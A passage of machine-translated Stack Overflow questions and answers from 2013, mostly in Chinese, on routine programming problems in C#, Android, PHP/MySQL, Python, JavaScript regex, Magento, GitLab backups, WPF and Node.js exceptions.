    System.Text.StringBuilder sbld = new System.Text.StringBuilder();
    if (Directory.Exists(Server.MapPath("~/Package_Image/")))
    {
        DirectoryInfo dirMail = new DirectoryInfo(Server.MapPath("~/Package_Image/"));
        FileInfo[] orig = dirMail.GetFiles();        
        // Sort on server
        FileInfo[] DefaultFiles = (from file in orig orderby file.CreationTime select file).ToArray();
        foreach (FileInfo fileDir in DefaultFiles)
        {
            if (fileDir.Extension.ToLower() == ".jpg" || fileDir.Extension.ToLower() == ".gif" || fileDir.Extension.ToLower() == ".png" || fileDir.Extension.ToLower() == ".jpeg" || fileDir.Extension.ToLower() == ".bmp")
            {
                // need sorting on the basis of date-time, it was created or uploaded.
                sbld.Append("<div class='itemBox'><table width='100%'><tr><td height='160'><img width='200' src='../Package_Image/" + fileDir.Name + "'></img></td></tr></table></div>");
            }
        }
        Literal1.Text = (sbld.ToString());
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:29:26.483

“System.Linq”可以提供帮助。包括一个 using 语句。

然后你可以像这样编写一个 lambda 表达式或一个 linq 查询

拉姆达表达式：

```
FileInfo[] SortedFiles = dirMail.GetFiles().OrderBy(file => file.CreationTime).ToArray(); 
```

Linq 查询：

```
FileInfo[] SortedFiles = (from file in dirMail.GetFiles() order by file.CreationTime select file).ToArray(); 
```

如果您需要先按日期时间降序排序，然后按名称升序排序，

拉姆达表达式：

```
FileInfo[] SortedFiles = dirMail.GetFiles().OrderByDescending(file => file.CreationTime).ThenBy(file => file.Name).ToArray(); 
```

Linq 查询：

```
FileInfo[] SortedFiles = (from file in dirMail.GetFiles() orderby file.CreationTime descending, file.Name ascending select file).ToArray(); 
```

# android - 即使应用程序不在前台，来自 Asynctask 的 onpostexecute() 的 startactivity 也会推送屏幕

> ID：15825684
> 
> 赞同：0
> 
> 时间：2013-04-05T04:00:05.893
> 
> 标签：android, android-asynctask

我正在尝试从 AsyncTask 的 onpostexecute 启动一项活动。如果在执行 AsyncTask 时应用程序进入后台，则 Activity 将被推送到手机的启动器屏幕。这是由于 AsyncTask 的默认行为。有没有办法避免这种行为？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:24:22.117

当您的活动将不再对用户可见（按下主页按钮等）时，`onPause()`将调用其方法。

```
@Override
public void onPause() {
    super.onPause();
    if (myAsyncTask != null) {
        myAsyncTask.Cancel(true); // allow task to be interrupted if in progress
    }
} 
```

这是假设您在 Activity 中有对 AsyncTask 的引用。如果您发布代码，我将能够更好地提供解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:23:58.100

使用这个方法：

（如果活动不在前台，则在 run() 中编写的代码将不会执行。在您的情况下是意图）

```
 @Override
    protected void onPostExecute(String result) {

        super.onPostExecute(result);

        if(null!=getActivity())
        {
            getActivity().runOnUiThread(new Runnable() {

                @Override
                public void run() {

            });
        }
    } 
```

**已编辑**- [注意：我在片段中使用它。因此它的getActivity()。如果您在活动中编写了 AsyncTask，请将 getActivity() 替换为 YourActivityName.this]

# android - Selenium-Java 库中缺少 AndroidWebDriver 类

> ID：15825690
> 
> 赞同：1
> 
> 时间：2013-04-05T04:00:19.083
> 
> 标签：android, selenium, webdriver

我尝试了通过 Selenium 进行 Android 应用程序测试中提供的示例，我已经包含了 selenium-java 库和 android-webdriver apk 也安装在模拟器中，但是当尝试使用论坛中提供的示例代码时，我在 AnroidWebDriver 导入中遇到错误，在 selenium 库中只有 AndroidDriver 类可用，所以我在哪里可以获得 AdroidWebDriver jar。请帮忙。

注意：Selenium 库是最新的一个。

```
import android.test.ActivityInstrumentationTestCase2;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.android.AndroidWebDriver;

import simple.app.SimpleAppActivity;

public class SimpleGoogleTest extends ActivityInstrumentationTestCase2<SimpleAppActivity> {
    private WebDriver driver;
    private WebDriver googledriver;

    public SimpleGoogleTest() {
        super("simple.app", SimpleAppActivity.class);
    }

    @Override
    protected void setUp() throws Exception {
      driver = new AndroidWebDriver(getActivity());
    }
........................,,,,,
  } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T07:52:19.267

Android 驱动程序有两种变体：

*   `AndroidDriver()`您在您的个人计算机上使用的，例如您的笔记本电脑、工作站等，它为您的测试提供了最丰富和最完整的功能集。
*   `AndroidWebDriver()`它在您的 Android 设备上运行，它包装了一个 WebView 组件以提供基本的核心功能。

Android SDK 附带的示例代码和对 Selenium/WebDriver 的可选支持在设备上运行一些基本测试。测试被编译为一个扩展`ActivityInstrumentationTestCase2`. `AndroidWebDriver()`包含在`sdk/extras/google/webdriver/android_webdriver_library.jar`（并且 Javadocs 在`sdk/extras/google/webdriver/android_webdriver_library-srcs.jar`

*所以，如果你想在你的 Android 设备上运行你的测试，那么你需要在你的项目中包含 android-webdriver-library.jar*。也许最简单的方法是将这个 jar 复制到您的测试项目的 libs 文件夹中。

但是，*如果您想在您的个人计算机上运行测试，您可以修改示例代码以使用**AndroidDriver**而不是**AndroidWebDriver***。您还需要更改您的基类，例如使用 Junit 3 或 Junit 4。我在此处发布了一个示例测试作为 Stack Overflow 上另一个问题的答案[在 Selenium Android Webdriver Testing 中使用 Xpath 和 CSS 查找元素时遇到困难](https://stackoverflow.com/questions/15780616/having-difficulty-in-finding-elements-using-xpath-and-css-in-selenium-android-we/15813240#15813240)

# haskell - 具有相同初始值的事件和行为是否存在问题？

> ID：15825695
> 
> 赞同：2
> 
> 时间：2013-04-05T04:00:35.287
> 
> 标签：haskell, frp, reactive-banana

我对下面的代码有些不满意。随着我的发展`bGameState`，我会添加更多的事件。`playerInputE`（我想其他的）共享相同的初始值这一事实会`Events`导致问题吗？换句话说，我的初始设计是否足够完善？

此外，是否有替代使用`changes`？我认为我符合正确使用的标准，但不确定。

```
makeNetworkDescription :: AddHandler PlayerCommand ->
                           TChan GameState ->
                           IO EventNetwork
makeNetworkDescription addCommandEvent gsChannel = compile $ do
  eInput <- fromAddHandler addCommandEvent
  let playerInputE = accumE initialGS $ updateGS <$> eInput
      bGameState = stepper initialGS playerInputE
      eGameState <- changes bGameState
      reactimate $ (\n -> (atomically $ writeTChan gsChannel n)) <$> eGameState 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T08:59:07.407

我不太明白您要做什么，但是您可以使用`accumB`定义为的组合器

```
accumB x e = stepper x (accumE x e) 
```

删除 的定义`playerInputE`。

在我看来，该`changes`功能使用正确。

# android - 我的应用程序不支持 nexus 7

> ID：15825696
> 
> 赞同：5
> 
> 时间：2013-04-05T04:00:47.930
> 
> 标签：android, android-manifest

我的清单文件（权限和支持屏幕）如下：

```
<uses-sdk
        android:maxSdkVersion="17"
        android:minSdkVersion="10"
        android:targetSdkVersion="17" />

    <permission
        android:name="com.ecw.healow.permission.C2D_MESSAGE"
        android:protectionLevel="signature" />

    <uses-permission android:name="my_app_package.permission.C2D_MESSAGE" />
    <!-- App receives GCM messages. -->
    <uses-permission android:name="com.google.android.c2dm.permission.RECEIVE" />
    <!-- GCM requires a Google account. -->
    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
    <!-- Keeps the processor from sleeping when a message is received. -->
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_MOCK_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.READ_CALENDAR" />
    <uses-permission android:name="android.permission.WRITE_CALENDAR" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    <uses-feature android:name="android.hardware.camera" android:required="true"/>
    <supports-screens
        android:anyDensity="true"
        android:largeScreens="true"
        android:normalScreens="true"
        android:smallScreens="true" /> 
```

上传到 Play 商店后，它没有显示 nexus-7 作为支持的设备。有什么猜测吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-05T04:30:36.240

虽然 Nexus 7 有一个前置摄像头，但根据[为 Jelly Bean 准备好您的应用程序](http://android-developers.blogspot.com/2012/07/getting-your-app-ready-for-jelly-bean.html)，需要摄像头意味着您的应用程序将显示为与 Nexus 7 不兼容。如果您希望与 Nexus 7 兼容，请设置 required="false"。

为确保在启动任何与相机相关的功能之前您有可用的相机，您可以[检测设备是否具有相机硬件](http://developer.android.com/guide/topics/media/camera.html#detect-camera)。

# php - Using a variable in a PHP MySQL Query

> ID：15825703
> 
> 赞同：-4
> 
> 时间：2013-04-05T04:02:08.900
> 
> 标签：php, mysql

I would like to user a variable inside of a PHP MySQL query to represent the WHERE clause like so:

```
$where= name=mark AND address=4;

$query= "SELECT * FROM clients WHERE $where"; 
```

Am I doing this correct? If not, what is the correct what to do so?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:04:49.297

您的 PHP 方法是正确的，但是您需要在 SQL 中的字符串周围加上单引号，并且还需要用引号将字符串 php 变量括起来，因此您的变量应如下所示：

```
$where = "name = 'mark' AND address = 4";
$query = "SELECT * FROM clients WHERE {$where}"; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T04:05:35.363

这就是你想要的：

```
$where = "name= 'mark' AND address= '4'";

$query= "SELECT * FROM clients WHERE $where"; 
```

在 $where 的值周围加上双引号。MySQL表字段的值也应该用引号括起来

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:12:24.797

您在引号内处理 php 变量的做法是错误的……而且您的语法也是错误的。每当您想在双引号中使用 php 变量时..您应该将其包含在方括号`{}`中。并且由于您使用`$where`的是字符串，它应该正确地包含在字符串中

```
$where= "name='mark' AND address=4";

$query= "SELECT * FROM clients WHERE {$where}"; 
```

虽然这在这里可能不相关，但另一个好的做法是在使用带有字符串的 php 变量时使用[sprintf()](http://php.net/manual/en/function.sprintf.php)

```
$query = sprintf("SELECT * FROM clients WHERE %s", $where); 
```

# python - Return statement not executing

> ID：15825708
> 
> 赞同：1
> 
> 时间：2013-04-05T04:02:52.713
> 
> 标签：python

Hey guys so i have a problem and it is that my return statement is not executing. This is my sudo code. It searches a tree to see if an item is in the tree.

```
def search(self, i):
    if left child is None and right child is None
        if self.data == i:
            return True
        else:
            pass 
    elif self.data == i:
        return True
    else:
        if left child exists:
            return self.left.search(i)
        if right child exists:
            return self.right.search(i) 
```

The code seems to work except when `self.data == i`, the code does not run the return True statement even though the if statement is executed. Does anyone know why this is? Thanks in advance!

EDIT: ADDED THE SELF PARAMETER. IT WAS SUPPOSED TO BE THERE, WAS A TYPO..

I inserted the numbers 3, 8, 2 and 1 into the tree and then searched for 1\. I added a print statement if left child is None and right child is None: if self.data == i: print('self.data == i') return True I added that print statement when searching for 1 and the print statement did print which means that the if statement was executed, however, the return True statement does not execute

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:04:20.500

我想您正在尝试进行二进制搜索，在这种情况下，您的代码中会出现一些问题。return 语句可能没有执行，因为条件`self.data == i`失败。另外，请注意，如果根有左孩子，则在您的原始代码中永远不会看到右孩子。

这是一个*线性*搜索的实现，我将把它作为练习修改为二分搜索。

```
def search(self, i):
    if self.data == i:
        return True

    if self.left is not None:
        if self.left.search(i):
            return True
    if self.right is not None:
        return self.right.search(i)
    return False 
```

# asp.net - file sharing web site in asp.net like dropbox , currently all uploaded data stored on my machine but i want to store that on multiple machine?

> ID：15825711
> 
> 赞同：3
> 
> 时间：2013-04-05T04:02:58.317
> 
> 标签：asp.net, file-upload, distributed-computing

i created web site and data base for that and works fine on single machine but now transform this on 2 machine in which website running on my PC but when end user upload the files it store on another PC ,so My PC will be middleware and end user does not know where the actually resource are lying? so how to connect my Pc to anothere just for data storage ?

# javascript - 带有逗号和空格的验证数字的正则表达式

> ID：15825714
> 
> 赞同：4
> 
> 时间：2013-04-05T04:03:11.570
> 
> 标签：javascript, regex

我不确定为什么这个正则表达式不起作用。我想验证输入是否采用这种格式：

1.  12345678,12345678,12345678
2.  *空格*12345678、12345678、12345678、12345678
3.  12345678,12345678,*空间*

如果不返回 false，则必须为 8 位。下面是我所做的正则表达式，但它适用于 2 组数字，但是当我输入另一组数字时，验证不起作用。

1.  工作：12345678、12345678
2.  不工作：12345678，12345678，12345678

```
var validate_numbers = /^\s*\d{8}\s*\+*(,\s*\d{8},*)?$/; 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:15:21.203

您需要更详细地描述您想要匹配的内容。我将假设您要匹配由逗号和加号分隔的 8 位数字，可能后跟逗号。

问题是您最多使用 2 组数字。[可视化](http://www.debuggex.com/?re=%5E%5Cs%2A%5Cd%7B8%7D%5Cs%2A%5C%2B%2A%28%2C%5Cs%2A%5Cd%7B8%7D%2C%2A%29%3F%24&str=12345678%2C12345678%2C+)。

鉴于上述假设，这是您想要的正则表达式：

```
^(\s*\d{8}\s*[+,]?\s*)*$ 
```

同样，您可以在[debuggex](http://www.debuggex.com/?re=%5E%28%5Cs%2a%5Cd%7B8%7D%5Cs%2a%5B%2b,%5D?%5Cs%2a%29%2a%24&str=12345678,12345678,%20)上对其进行可视化。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:20:17.283

您能否提供有关要求的更多详细信息？逗号前需要空格吗？

```
\\d{8}(?:,\\d{8})*+ 
```

试试看。它适用于验证数字列表的要求，该列表有 8 位数字，并用逗号分隔。

希望它会有所帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:25:02.077

从您当前的正则表达式中删除“$”。它与行尾严格匹配，这导致您的表达式在所需的字符串上返回 false。以下代码为您提到的先前返回 FALSE 的字符串返回 TRUE。

omgerd 我在 PHP 中自动编写了第一个响应，这里是快速 JS 编辑

```
var pattern = /^\s*\d{8}\s*\+*(,\s*\d{8},*)?/;
var data2 = '12345678 , 12345678 ,12345678';
if (pattern.test(data2) != 0) {
    alert("ok");
} 
```

输出：好的

# magento - Is it possible to use Twitter Bootstrap to create a Magento site?

> ID：15825717
> 
> 赞同：6
> 
> 时间：2013-04-05T04:03:45.187
> 
> 标签：magento, twitter-bootstrap, themes

A client wants a Magento site done, and I have never used it before. I thought, "Sure, I'll create a standard site using Bootstrap and just query the database for the products". Now that I've been looking into it, it looks like the only way to use Magento is by creating a Theme which doesn't look to be Bootstrap friendly.

Please someone tell me that creating Themes isn't the only legitimate way of creating a Magento site.

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T18:58:13.720

Some starting points:

[http://www.bootstrapstart.com/portfolio-type/bootstrap-magento-theme/](http://www.bootstrapstart.com/portfolio-type/bootstrap-magento-theme/)

[http://magenthon.com](http://magenthon.com) (info and code) or [demo here](http://bootstrapped.magenthon.com)

[https://github.com/cvaldemar/magento-bootstrap](https://github.com/cvaldemar/magento-bootstrap) (doesn't seem too active though ?)

If this is something you are planning on doing yourself, the second link looks like a promising candidate to download, reverse engineer then cusomise!

Good luck

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-18T09:58:04.297

[https://github.com/webcomm/magento-boilerplate](https://github.com/webcomm/magento-boilerplate)

[http://www.webcomm.com.au/blog/2013/09/introducing-magento-boilerplate-a-twitter-bootstrap-3-powered-html5-mobile-first-starter-theme](http://www.webcomm.com.au/blog/2013/09/introducing-magento-boilerplate-a-twitter-bootstrap-3-powered-html5-mobile-first-starter-theme)

Newest, Magento 1.8 supported

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T18:54:16.750

Yes, Try [this Magento Bootstrap](https://github.com/cvaldemar/magento-bootstrap) framework but it's unstable version.

# c# - WPF HD background video playback lags UI

> ID：15825718
> 
> 赞同：2
> 
> 时间：2013-04-05T04:03:50.937
> 
> 标签：c#, wpf, xaml, optimization, video

I've a touch screen application built using WPF running at HD resolution (1920 x 1080) and i have a looping background video that is also in HD. The background video runs as long as the lifetime of the app. The UI is placed "above" (in z order). However the UI's rendering seems jerky and laggy and I want to improve this performance. When i run the app without the video running, my UI runs smoother as expected. Can anyone suggest a way to improve my UI responsiveness? Below is the details of my looping video file.

EDIT: Some investigations I did: On slower computers, the video and UI becomes laggy. However, when running the video alone, the video runs very smoothly. When running the UI without the video, it also runs very smoothly. The problem arises when we have the video and the UI running together, somehow the rendering becomes sluggish. I am using MediaUriElement control from WPFMediaKit. I tried to use the Win7DSFilterTweaker to change the Windows 7 default decoder but to no avail. Any suggestions?

EDIT 2: The bottleneck seems to be from the WPF rendering engine. When I ran the video, the FPS drops to ~34fps. When I paused the video, it is running at 60fps again. So any suggestions here?

```
Video
ID                             : 0
Format                         : MPEG-4 Visual
Codec ID                       : DIV3
Codec ID/Hint                  : DivX 3 Low
Duration                       : 12s 12ms
Bit rate                       : 8 558 Kbps
Width                          : 1 920 pixels
Height                         : 1 080 pixels
Display aspect ratio           : 16:9
Frame rate                     : 29.970 fps
Color space                    : YUV
Chroma subsampling             : 4:2:0
Bit depth                      : 8 bits
Compression mode               : Lossy
Bits/(Pixel*Frame)             : 0.138
Stream size                    : 12.3 MiB (100%) 
```

# apache-camel - 如何避免使用 Camel 使用死信队列

> ID：15825722
> 
> 赞同：2
> 
> 时间：2013-04-05T04:04:14.397
> 
> 标签：apache-camel

我在 Camel 有一个 in/out 制作人，他只会在有限的时间里闲逛，然后再回到来电者那里。有时，这自然会导致死信项目和响应迟到时调用者捕获的异常。

我想做的是让调用者收到超时消息而不是异常，并且该项目永远不会出现在 DLQ 中。当然，我可以在 DLQ 上放置一个监听器，但由于该项目有一个家可以去，它不应该真正到达 DLQ。

有没有人有这个模式？怎么做？有多余的消费者模式（请参阅 Camel in Action[链接](http://amzn.com/1935182366)），但这是由输入/输出模式产生的一种组合的生产者/消费者问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-02-25T11:42:47.723

听起来您正在使用死信通道错误处理程序，请尝试使用 noErrorHandler - [http://camel.apache.org/error-handler](http://camel.apache.org/error-handler)

# gitlab - GitLab：备份 rake 任务是原子的吗？

> ID：15825735
> 
> 赞同：8
> 
> 时间：2013-04-05T04:05:04.220
> 
> 标签：gitlab

如果我在有人推送到存储库时使用[gitlab:backup:create rake 任务进行 GitLab 备份，备份过程会受到影响吗？](https://gitlab.com/gitlab-org/gitlab-ce/blob/master/doc/raketasks/backup_restore.md)

在进行备份之前是否需要关闭 GitLab？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-05T05:47:07.510

任务[`gitlab/backup.rake`](https://github.com/gitlabhq/gitlabhq/blob/master/lib/tasks/gitlab/backup.rake)本身看起来不是原子的。
它调用：

```
 Rake::Task["gitlab:backup:db:create"].invoke
  Rake::Task["gitlab:backup:repo:create"].invoke 
```

[使用](https://github.com/gitlabhq/gitlabhq/blob/master/lib/tasks/gitlab/backup.rake#L172-L192)[gem`activerecord`](https://rubygems.org/gems/activerecord)：_

```
 puts "Dumping database tables ... ".blue
    ActiveRecord::Base.connection.tables.each do |tbl|
    ... 
```

与 ActiveRecord 的其他操作一样（请参阅[此问题](https://stackoverflow.com/questions/14387022/atomic-insert-or-increment-in-activerecord-rails)），它似乎不是全局原子操作。

* * *

等一下，几个小时前， GitLab 的主要开发人员[randx (Dmitriy Zaporozhets)](https://github.com/randx)刚刚重构了转储数据库：

*   [commit 38d23c0e5f816937047c9326f9dd33fb10490032](https://github.com/gitlabhq/gitlabhq/commit/38d23c0e5f816937047c9326f9dd33fb10490032)显示了系统调用的使用`mysqldump`：
    `system("mysqldump #{mysql_args} #{config['database']} > #{db_file_name}")`
*   [提交 c33d5e16fe5f5dde4f270adaf7fb6fe5b9552018](https://github.com/gitlabhq/gitlabhq/commit/c33d5e16fe5f5dde4f270adaf7fb6fe5b9552018)添加`GRANT SELECT, LOCK TABLES, ...`

所以转储数据库的部分现在更具原子性；）
但是备份本身，包括备份裸存储库在内的其他步骤，不是原子的。

# android - Build Android app based on Android Source instead of official sdk

> ID：15825744
> 
> 赞同：0
> 
> 时间：2013-04-05T04:06:33.967
> 
> 标签：android

I would like to modify the existing source of the android sdk, so for instance, in LinearLayout and say put an print message or adding some paddings to the constant

so is there a way i can create a new android app, and have it depends on the sdk source instead of choosing a sdk in projection creation.

thanks

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:12:54.943

The Android SDK provides you the API libraries and developer tools necessary to build, test, and debug apps for Android.

Even if you modify it, rebuild it, and build your application against this modified version when you install it on a real device your application won't be able to find your modifications.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:14:02.207

Yes you can, all views in android are in form of classes which can be extended ad new views or custom views with custom parameters can be formed and used in your app.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T05:24:30.450

You can extend LinearLayout, or extend a ViewGroup class (which is what all standard layouts extend). In layout xml you can declare it as a custom view:

```
<com.example.MyLayout
       adnroid:layout_width="..." 
 ... >

</com.example.MyLayout> 
```

My problem was that inflater ignored all children under my custom layout. Maybe I did something wrong, and you will be luckier :) In the worst scenario you may have a separate layout xml for children and add it programmatically after inflating.

Embedding your own layout into Android system is not a good practice for a mere reason that in that case you will have to supply a modified Android system to all users of your app :)

# c++ - 在没有 .dll(s) 的计算机上使用 Visual Studio 2012 c++ .exe

> ID：15825747
> 
> 赞同：0
> 
> 时间：2013-04-05T04:06:36.287
> 
> 标签：c++, opengl, dll, glew, freeglut

所以我正在使用 c++ glut 和 glew 制作游戏，我将 4 个不同的 .dll 文件安装到我的系统文件夹中，分别为 32 位和 64 位，

所以现在我想知道，因为我将 .exe 移动到另一台计算机并且它无法运行，我可以创建一个包含它们的安装程序吗？像普通应用程序也安装到系统文件夹一样吗？或者它会自动检测与应用程序相同文件夹中的 .dll，还是我必须在 c++ 中更改某些内容？

# c# - ItemsControl.ItemsPanel 中的 Wrappanel 引发 XamlParseException

> ID：15825748
> 
> 赞同：0
> 
> 时间：2013-04-05T04:06:47.637
> 
> 标签：c#, silverlight, windows-phone-7, itemscontrol, wrappanel

在我的 wp8 应用程序中，我展示了一些内容（例如图像）。我使用 LongListSelector，并且在每个 LLS 的项目中都有带有图像集合的 ItemsControl。我想在一行中显示两个图像，所以我使用了一个包装板。但它`InitializeComponent()`在用户控件的页面中抛出 XamlParseException。没有 wrappanel 一切正常。这里的代码

```
 <ItemsControl HorizontalAlignment="Center" ItemsSource="{Binding Vkontakte.Attachments.Photos}" >
            <ItemsControl.ItemsPanel>
                <ItemsPanelTemplate>
                    <toolkit:WrapPanel Height="100" Width="100" />
                </ItemsPanelTemplate>
            </ItemsControl.ItemsPanel>

            <ItemsControl.ItemTemplate>
                <DataTemplate>
                <Image Margin="0,10,0,0" >
                    <Image.Source>
                        <BitmapImage UriSource="{Binding Src}" CreateOptions="BackgroundCreation" />
                    </Image.Source>
                </Image>
            </DataTemplate>
            </ItemsControl.ItemTemplate>
        </ItemsControl> 
```

**也许问题出在这种情况下，那`ItemsControl`就是`StackPanel`？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T19:30:03.127

由于您的 ItemsSource 绑定，我会抛出异常。如果 Vkontakte 不是您的数据上下文中的对象，那么您可能需要查看您绑定的对象。它需要是某种对象的集合。

# ruby-on-rails - 路由多态请求 Rails

> ID：15825749
> 
> 赞同：2
> 
> 时间：2013-04-05T04:06:49.330
> 
> 标签：ruby-on-rails, ruby-on-rails-3, polymorphism

在 rails 3 中，我有几个多态模型，例如`Image`and `Comment`，所以我的问题是，

当有人请求创建/更新/销毁多态对象时，该请求应该转到多态对象的单个控制器`CommentController`，还是应该将请求路由到多态访问器的控制器，`StatusController`即`ImageController`？

单个控制器的优点是它更 DRY 并且可能更 RESTful，不好的是在我看来它更像是耦合应用程序，其中许多东西由一个控制器捆绑在一起。有人对这个问题有官方答案吗？

编辑：问题不是问路线去哪里，问题是问**路线应该去哪里？什么是最语义化的解决方案？**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:11:35.703

感谢您的澄清。

您应该让评论控制器处理评论上的 CRUD 操作。您最初的论点是正确的，这种方式更加干燥和 RESTful。评论控制器必须处理的额外后勤工作并没有那么复杂，因此您仍然应该留下相对较薄的评论控制器。如果您仍然担心评论控制器中的操作越来越胖，您可以通过在评论模型中编写方法来处理一些逻辑来抽象出一些逻辑。

# ajax - Ajax rss 提要在本地主机上不起作用

> ID：15825750
> 
> 赞同：0
> 
> 时间：2013-04-05T04:06:53.887
> 
> 标签：ajax, rss

我正在尝试从 w3schools 获取以下代码以通过 IIS 工作哦我的本地主机。当我运行它时，我可以看到它正在尝试检索请求的 rss 提要，但不幸的是它永远不会执行。它只允许我查看可供选择的选项，但从不显示它们。

非常感谢您的帮助。

```
<html>
    <head>
        <script>
            function showRSS(str)
            {
                if (str.length==0)
                  {
                  document.getElementById("rssOutput").innerHTML="";
                  return;
                  }
                if (window.XMLHttpRequest)
                  {// code for IE7+, Firefox, Chrome, Opera, Safari
                  xmlhttp=new XMLHttpRequest();
                  }
                else
                  {// code for IE6, IE5
                  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
                  }
                xmlhttp.onreadystatechange=function()
                  {
                  if (xmlhttp.readyState==4 && xmlhttp.status==200)
                    {
                    document.getElementById("rssOutput").innerHTML=xmlhttp.responseText;
                    }
                  }
            xmlhttp.open("GET","getrss.php?q="+str,true);
            xmlhttp.send();
        }
        </script>
    </head>
<body>

    <form>
        <select onchange="showRSS(this.value)">
            <option value="">Select an RSS-feed:</option>
            <option value="Google">Google News</option>
            <option value="MSNBC">MSNBC News</option>
        </select>
    </form>
    <br>
    <div id="rssOutput">RSS-feed will be listed here...</div>
    </body>
</html> 
```

和 php 文件

```
<?php
    header('Access-Control-Allow-Origin: *');
    //get the q parameter from URL
    $q=$_GET["q"];

    //find out which feed was selected
    if($q=="Google")
          {
          $xml=("http://news.google.com/news?ned=us&topic=h&output=rss");
          }
        elseif($q=="MSNBC")
          {
      $xml=("http://rss.msnbc.msn.com/id/3032091/device/rss/rss.xml");
      }

    $xmlDoc = new DOMDocument();
    $xmlDoc->load($xml);

    //get elements from "<channel>"
    $channel=$xmlDoc->getElementsByTagName('channel')->item(0);
    $channel_title = $channel->getElementsByTagName('title')
    ->item(0)->childNodes->item(0)->nodeValue;
    $channel_link = $channel->getElementsByTagName('link')
    ->item(0)->childNodes->item(0)->nodeValue;
    $channel_desc = $channel->getElementsByTagName('description')
    ->item(0)->childNodes->item(0)->nodeValue;

    //output elements from "<channel>"
    echo("<p><a href='" . $channel_link
      . "'>" . $channel_title . "</a>");
    echo("<br>");
    echo($channel_desc . "</p>");

    //get and output "<item>" elements
    $x=$xmlDoc->getElementsByTagName('item');
    for ($i=0; $i<=2; $i++)
      {
      $item_title=$x->item($i)->getElementsByTagName('title')
      ->item(0)->childNodes->item(0)->nodeValue;
      $item_link=$x->item($i)->getElementsByTagName('link')
      ->item(0)->childNodes->item(0)->nodeValue;
      $item_desc=$x->item($i)->getElementsByTagName('description')
      ->item(0)->childNodes->item(0)->nodeValue;

      echo ("<p><a href='" . $item_link
      . "'>" . $item_title . "</a>");
      echo ("<br>");
      echo ($item_desc . "</p>");
      }
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-11-15T22:34:00.683

因为 html 代码是这样做的：

*   检查是否选择了 RSS 提要；**然后**
*   创建服务器响应准备好时要执行的函数；**然后**
*   **将请求发送到服务器上的文件**，

你在你的mac上使用这个吗？我认为 localhost 无法在 os x 中给出服务器响应。或者，您必须使用终端解锁某些东西才能使其工作。

这段代码是正确的，因为它确实在我的服务器上工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:10:02.547

也许这是一个跨平台的问题。

如果您使用的是 Chrome，请尝试像这样打开它：

```
chrome.exe -allow-file-access-from-files 
```

# javascript - 为什么异常会导致 Node.js 中的资源泄漏？

> ID：15825752
> 
> 赞同：25
> 
> 时间：2013-04-05T04:06:59.813
> 
> 标签：javascript, node.js, exception, memory-management, memory-leaks

[如果您查看域的 Node.js 文档](http://nodejs.org/api/domain.html)的开头，它会指出：

> 由于 throw 在 JavaScript 中的工作原理，几乎没有任何方法可以安全地“从上次中断的地方继续”，而不会泄漏引用或创建其他类型的未定义脆弱状态。

同样在代码示例中，它在第一部分给出了它说：

> 尽管我们已经阻止了突然的进程重启，但我们正在疯狂地泄漏资源

我想了解为什么会这样？哪些资源正在泄漏？他们建议您仅使用域来捕获错误并安全地关闭进程。这是所有例外的问题，而不仅仅是在使用域时？在 Javascript 中抛出和捕获异常是一种不好的做法吗？我知道这是 Python 中的一种常见模式。

**编辑**

如果抛出异常，我可以理解为什么在非垃圾收集语言中可能存在资源泄漏，因为如果抛出异常，您可能运行来清理对象的任何代码都不会运行。

我可以用 Javascript 想象的唯一原因是，如果抛出异常会将对变量的引用存储在引发异常的范围内（可能还有调用堆栈中的东西），从而保持引用，然后异常对象被保留并且永远不会被清理干净。除非提到的泄漏资源是引擎内部的资源。

**更新**

我写了一篇博客，现在更好地解释了这个问题的答案。[看看这个](http://www.teknically-speaking.com/2013/04/javascript-and-nodejs-exceptions-and.html)

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-04-08T08:02:43.957

